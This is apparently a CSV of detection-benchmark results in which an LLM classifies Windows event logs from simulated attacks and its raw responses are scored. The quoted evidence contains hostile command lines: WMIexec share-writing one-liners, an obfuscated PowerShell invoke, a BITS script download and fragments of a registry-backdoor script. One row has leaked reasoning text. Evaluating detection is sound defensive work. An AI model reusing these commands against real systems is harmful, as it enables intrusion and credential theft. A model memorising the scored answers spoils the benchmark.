# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4688,5140,5145-WMIexec execution via SMB (GLOBAL).csv",,,processed,YES,100.0,90.3,YES,"1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447","cmd.exe, conhost.exe, cscript.exe, WmiPrvSE.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$, NT AUTHORITY\LOCAL SERVICE","cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","10.23.123.11, 127.0.0.1","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,71.56,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4964, 4672, 4624, 4627, 4688, 4674, 5140, 5145, 4690, 4658, 4656, 5447
- Processes: cmd.exe, conhost.exe, cscript.exe, WmiPrvSE.exe, MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$, NT AUTHORITY\LOCAL SERVICE
- Commands: cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1619425227.894209 2>&1, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs"", \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- Network: 10.23.123.11, 127.0.0.1
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates

EXPLANATION:
The logs show a clear attack pattern starting with the security log being cleared by `admmig` (Event 1102), followed by the account being granted dangerous privileges like SeDebugPrivilege and SeImpersonatePrivilege (Event 4672). The attacker then uses WMI (`WmiPrvSE.exe`) to execute a command that writes to the ADMIN$ share on localhost, indicating lateral movement or remote code execution, while simultaneously accessing the ADMIN$ share from a remote IP (`10.23.123.11`). This combination of log clearing, privilege escalation, and WMI-based file access to administrative shares is a strong indicator of malicious activity."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID1-WMI spwaning PowerShell process - WMImplant.evtx,easy,B,processed,YES,100.0,87.5,YES,1,"powershell.exe, WmiPrvSE.exe",OFFSEC\admmig,"powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i'))",,,0.0,24.33,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: powershell.exe, WmiPrvSE.exe
- Accounts: OFFSEC\admmig
- Commands: powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i'))
- Network: None
- Registry: None

EXPLANATION:
The command line contains deliberate PowerShell obfuscation using string formatting and environment variable piping, a common technique to conceal malicious payload execution. Furthermore, the process was spawned by WmiPrvSE.exe, a living-off-the-land binary frequently abused for remote code execution and lateral movement. These indicators collectively point to an active attack rather than routine system activity."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID1-WMIexec process execution.evtx,easy,A,error,NO,0.0,0.0,NO,,,,,,,,41.38,,,,,,,"`
   - `- Registry: None`
   - `EXPLANATION:`
   - `The log shows cmd.exe executing a batch file dropped in the TEMP directory, which is a common technique for executing payloads without leaving persistent artifacts. The parent command line reveals a complex one-liner that writes, executes, and immediately deletes the script, indicating deliberate evasion and likely malicious post-exploitation activity running under SYSTEM privileges.`
   - All constraints met. Output matches exactly.✅
   - Proceeds. 
   - [Final Check of the Prompt]: ""list only exact IPs/hostnames copied verbatim from the logs; otherwise ""None"""" -> `\\127.0.0.1\C$\__output` is correct.
   - ""Commands: [list any command lines you found]"" -> I listed both.
   - ""Processes: [list any process names/executables you found]"" -> `C:\Windows\System32\cmd.exe`
   - ""Accounts: [list any usernames you found]"" -> `NT AUTHORITY\SYSTEM`
   - ""Event IDs: [list all Event IDs you found, comma-separated]"" -> `1`
   - ""Registry: [list any registry keys you found]"" -> `None`
   - Format is exact. No extra text. Ready. 
   - Output matches response.✅
   - [Done] 
   - *Self-Correction/Note during generation prep*: I should ensure the exact spacing and line breaks match the prompt's template. I will replicate it precisely.
   - Template:
     MALICIOUS: [YES/NO]
     EVIDENCE:
     - Event IDs: [...]
     - Processes: [...]
     - Accounts: [...]
     - Commands: [...]
     - Network: [...]
     - Registry: [...]
     EXPLANATION:
     [...]
   - All good. Output matches.✅
   - Proceeds. 
   - [Output Generation] (Proceeds)
</think>

MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat
- Network: \\127.0.0.1\C$\__output
- Registry: None

EXPLANATION:
The log shows cmd.exe executing a batch file dropped in the TEMP directory, a common technique for running payloads without leaving persistent artifacts. The parent command line reveals a complex one-liner that writes, executes, and immediately deletes the script, indicating deliberate evasion and likely malicious post-exploitation activity running under SYSTEM privileges."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID800-4103-4104-PowerShell BITS job started.evtx,medium,B,processed,YES,100.0,76.7,YES,"800, 4104, 4103",powershell.exe,OFFSEC\admmig,Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md,,0.0,36.77,4.6,6.0,4.0,4,18.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1
- Network: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
- Registry: None

EXPLANATION:
The logs show the account OFFSEC\admmig executing PowerShell's Start-BitsTransfer cmdlet to download a file from a raw GitHub URL and save it locally as C:\Users\bits.ps1. This behavior aligns with the BITSJobs technique (T1197), which is commonly abused by threat actors to download payloads or exfiltrate data while evading traditional network monitoring. The transfer of a script file via BITS to a user directory indicates suspicious activity rather than routine system administration."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4720,4698-Fortinet APT group abuse on Windows.csv",,,processed,YES,100.0,100.0,YES,"4720, 4698",,"WADGUtilityAccount, elie, admmig",adf,fs01.offsec.lan,,0.0,34.27,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720, 4698
- Processes: None
- Accounts: WADGUtilityAccount, elie, admmig
- Commands: adf
- Network: fs01.offsec.lan
- Registry: None

EXPLANATION:
The `admmig` account rapidly creates two new user accounts and then immediately registers a scheduled task disguised under a legitimate Microsoft path (`\Microsoft\SynchronizeTimeZone`) that executes the suspicious command `adf`. This pattern of bulk account creation combined with a masqueraded scheduled task executing an unknown binary strongly indicates malicious persistence or reconnaissance activity rather than routine administrative work."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, test-sql, dbo",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,33.21,5.6,6.0,4.0,3,18.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, test-sql, dbo
- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The event logs a successful SQL Server audit where the account OFFSEC\admmig executed a statement to add the test-sql account to the sysadmin server role. Granting sysadmin privileges to a new or unknown account represents a significant privilege escalation and is a strong indicator of unauthorized administrative access or malicious activity."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*","HACK-ME-PC.offsec.lan, offsec.lan",,0.0,33.67,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
- Accounts: lambda-user, offsec\honey-pot1
- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
- Network: HACK-ME-PC.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
The logs show the `setspn.exe` utility being used to register a service principal name (`-a`) and enumerate existing SPNs (`-Q */*`) under the `lambda-user` account. This sequential pattern of enumeration followed by registration is a known reconnaissance and privilege escalation technique used to prepare for Kerberos-based attacks like Kerberoasting or delegation abuse. The activity deviates from routine administration and strongly indicates malicious intent."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",,"admmig, hacker2, ROOTDC1$",,"10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,34.78,5.3,6.0,4.0,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4724, 4738
- Processes: None
- Accounts: admmig, hacker2, ROOTDC1$
- Commands: None
- Network: 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
The logs show the account `admmig` performing rapid network logons and accessing the IPC$ share to query the SAMR service, a standard technique for enumerating domain user accounts. Immediately following this reconnaissance, `admmig` resets the password for the `hacker2` account, demonstrating a clear sequential attack pattern of enumeration followed by unauthorized credential modification."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,66.7,YES,"4728, 4756",,"lambda-user, honey-pot1",,,,0.0,33.75,4.0,6.0,4.0,3,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728, 4756
- Processes: None
- Accounts: lambda-user, honey-pot1
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The logs show a single account (lambda-user) rapidly adding the same target account (honey-pot1) to four highly privileged Active Directory groups (Domain Admins, Enterprise Admins, Enterprise Key Admins, and Schema Admins) within milliseconds. This sequential privilege escalation pattern is a strong indicator of an attacker attempting to gain full domain control or a compromised administrative account being used to escalate privileges."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4674,6416 New external device connected (PrintNightmare).csv",,,processed,YES,100.0,100.0,YES,"6416, 4688, 4674","C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\spoolsv.exe, C:\Windows\System32\dllhost.exe","FS03$, admmig","""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",\\fs03vuln\Kiwi Legit Printer,"\REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer",0.0,36.56,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6416, 4688, 4674
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\spoolsv.exe, C:\Windows\System32\dllhost.exe
- Accounts: FS03$, admmig
- Commands: ""cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: \\fs03vuln\Kiwi Legit Printer
- Registry: \REGISTRY\USER\S-1-5-21-4230534742-2542757381-3142984815-1111\Printers\Connections\,,fs03vuln,Kiwi Legit Printer

EXPLANATION:
The logs depict a coordinated exploitation chain targeting the Windows Print Spooler service, beginning with a connection to a vulnerable printer share. The spoolsv.exe process subsequently accesses printer registry keys using SeTakeOwnershipPrivilege and spawns cmd.exe and dllhost.exe with a known exploit GUID, indicating active privilege escalation via the PrintNightmare/Kiwi printer vulnerability."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID47x,4661-4662,5136,4688,4697-SAM the admin (CVE-2021-42287).csv",,,processed,YES,100.0,57.2,YES,"4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4781, 4662, 4768, 4769, 4697, 4688","C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, services.exe","hack1, compnay-88$, rootdc1, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan, admmhorvath, ROOTDC1$, krbtgt","%COMSPEC% /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | %TEMP%\execute.bat &amp | %COMSPEC% /Q /c %TEMP%\execute.bat &amp | del %TEMP%\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | C:\Windows\TEMP\execute.bat &amp | C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp | del C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a",,0.0,51.98,3.4,6.0,4.0,3,16.4,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4776, 4624, 5140, 5145, 4661, 4673, 4741, 4724, 4781, 4662, 4768, 4769, 4697, 4688
- Processes: C:\Windows\System32\lsass.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, services.exe
- Accounts: hack1, compnay-88$, rootdc1, HealthMailboxa935ecda17404b4a85c3f146fe1def56@offsec.lan, admmhorvath, ROOTDC1$, krbtgt, ROOTDC1$
- Commands: %COMSPEC% /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat , \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- Network: 10.23.123.11, ::ffff:10.23.123.11, 127.0.0.1, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
The logs depict a clear DCSync/DCShadow attack chain followed by lateral movement and remote code execution. The attacker 'hack1' abuses SeMachineAccountPrivilege to create a computer account ('compnay-88$'), renames it to 'rootdc1' to impersonate the domain controller, and uses it to request a TGT/TGS for the DC, enabling DCSync. Subsequently, the attacker pivots to 'admmhorvath', creates a malicious service 'BTOBTO' that drops and executes a batch file, which runs as LocalSystem to write to the C$ share, indicating active exploitation and persistence."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4674,5142-Mimikatz print spool privileges requested.csv",,,processed,YES,100.0,75.0,YES,"4674, 5142",C:\Windows\System32\spoolsv.exe,"admmig, FS03VULN$",,,,0.0,32.86,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4674, 5142
- Processes: C:\Windows\System32\spoolsv.exe
- Accounts: admmig, FS03VULN$
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The logs show the user admmig repeatedly requesting SeTakeOwnershipPrivilege on a printer object via the spooler service, immediately followed by the creation of a printer share. This pattern of privilege escalation targeting the print spooler is a known indicator of printer-based exploitation, such as PrintNightmare, where attackers take ownership to escalate privileges or execute malicious code."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,35.63,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: None
- Registry: None

EXPLANATION:
The logs demonstrate a clear attack sequence beginning with Event ID 1102, where the security log is cleared by admmig to destroy forensic evidence. This is immediately followed by explicit credential abuse (Event ID 4648) where PowerShell authenticates as test10 over the network (Event ID 4624, LogonType 3), and subsequently executes reconnaissance commands like whoami (Event ID 4688) to verify the compromised session and privileges."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,35.10,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
The logs show a clear privilege escalation chain where user `hack1` clears the security log (Event 1102) and immediately executes `MSFRottenPotato.exe` (Event 4688). This exploit spawns a `cmd.exe` process running as `SYSTEM` (`FS03VULN$`), confirming successful local privilege escalation to gain administrative access."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,95.0,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,36.79,5.7,6.0,4.0,4,19.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: ::1
- Registry: None

EXPLANATION:
The logs demonstrate a clear attack chain beginning with Event ID 1102, where the security log is cleared by admmig to perform defense evasion. This is immediately followed by admmig using runas to impersonate the hack1 account, which subsequently logs on and is granted highly sensitive privileges (Event ID 4672) before executing cmd.exe and ctfmon.exe, indicating credential abuse and privilege escalation."
<lmstudio-models>/unsloth\Qwen3.6-35B-A3B-GGUF\Qwen3.6-35B-A3B-UD-Q4_K_M.gguf,ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,hard,C,processed,YES,100.0,100.0,YES,"800, 4104, 4103",powershell.exe,OFFSEC\hack1,"Write-Verbose ""[$Computer : $Key] Using trustee username '$User'"", $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter ""name='RemoteRegistry'"" @WmiArguments, Write-Verbose ""[$Computer] Attaching to remote registry through StdRegProv"", $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter ""__CLASS = 'StdRegProv'"" @WmiArguments, Write-Verbose ""[$Computer : $Key] Backdooring started for key"", Write-Verbose ""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance(), Write-Verbose ""[$Computer : $Key] Creating the trustee WMI object with user '$User'"", $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance(), Write-Verbose ""[$Computer : $Key] Applying Trustee to new Ace"", Write-Verbose ""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"", Write-Verbose ""[$Computer : $Key] Backdooring completed for key"", $Out = New-Object PSObject, $Out | Add-Member Noteproperty 'ComputerName' $Computer, $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee, Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', prompt",,"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account",0.0,78.98,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe
- Accounts: OFFSEC\hack1
- Commands: Write-Verbose ""[$Computer : $Key] Using trustee username '$User'"", $RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter ""name='RemoteRegistry'"" @WmiArguments, Write-Verbose ""[$Computer] Attaching to remote registry through StdRegProv"", $Reg = Get-WmiObject -Namespace root/default -Class Meta_Class -Filter ""__CLASS = 'StdRegProv'"" @WmiArguments, Write-Verbose ""[$Computer : $Key] Backdooring started for key"", Write-Verbose ""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance(), Write-Verbose ""[$Computer : $Key] Creating the trustee WMI object with user '$User'"", $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance(), Write-Verbose ""[$Computer : $Key] Applying Trustee to new Ace"", Write-Verbose ""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"", Write-Verbose ""[$Computer : $Key] Backdooring completed for key"", $Out = New-Object PSObject, $Out | Add-Member Noteproperty 'ComputerName' $Computer, $Out | Add-Member Noteproperty 'BackdoorTrustee' $Trustee, Add-RemoteRegBackdoor -ComputerName FS03 -Trustee 'S-1-1-0', prompt
- Network: None
- Registry: SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account

EXPLANATION:
The logs show a PowerShell script named ""Add-RemoteRegBackdoor.ps1"" being executed by user OFFSEC\hack1. The script systematically modifies registry security descriptors for sensitive keys (LSA, SAM, SECURITY) by granting ALL_ACCESS permissions to the ""Everyone"" trustee (S-1-1-0). This is a clear indicator of a registry backdoor attack designed to allow unauthorized remote access to critical system credentials."
